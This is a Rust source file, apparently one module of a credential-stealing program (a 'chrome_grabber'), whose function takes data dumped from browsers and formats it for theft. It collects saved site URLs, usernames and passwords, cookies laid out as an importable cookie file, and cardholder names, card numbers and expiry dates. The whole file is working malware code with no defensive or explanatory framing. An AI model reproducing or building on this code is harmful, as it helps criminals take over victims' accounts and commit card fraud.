use std::collections::HashMap;

use crate::chrome_grabber::dumper::Dumper;

pub fn compact_br_data(browser_data: Vec<Dumper>) -> HashMap<String, String> {
    let mut result: HashMap<String, String> = HashMap::new();


    let mut buffer = String::new();
    
    for data in browser_data.iter() {
        for cred in data.accounts.iter() {
            buffer = format!("{}URL: {}\nUsername: {}\nPassword: {}\n\n\n", buffer, cred.website, cred.username_value, cred.pwd);
        }
        buffer = buffer.trim_end_matches("\n\n").to_string();
        result.entry(String::from("password")).or_insert(buffer.clone());
        buffer.clear();
        
        for cookie in data.cookies.iter() {
            let sec: &str;
            if cookie.secure == 1 {
                sec = "TRUE";
            } else {
                sec = "FALSE";
            }
            buffer = format!("{}{}\t{}\t{}\t{}\t{}\t{}\t{}\n",
            buffer, cookie.hostkey, sec, cookie.path, "TRUE", cookie.expire_utc, cookie.name, cookie.encrypted_cookie);
        }
        buffer = buffer.trim_end_matches("\n").to_string();
        result.entry(String::from("cookie")).or_insert(buffer.clone());
        buffer.clear();
        buffer = format!("{} {}", data.app_info.author, data.app_info.name);
        result.entry(String::from("app_info")).or_insert(buffer.clone());
        buffer.clear();
        for cc in data.creditcards.iter() {
            buffer = format!("{}Name: {}\ncc: {}\nYear: {}\nMonth: {}\n\n", buffer, cc.name_on_card, cc.encrypted_number, cc.expiration_year, cc.expiration_month);
        }
        buffer = buffer.trim_end_matches("\n").to_string();
        result.entry(String::from("cc")).or_insert(buffer.clone());
        buffer.clear();
    }
    result

}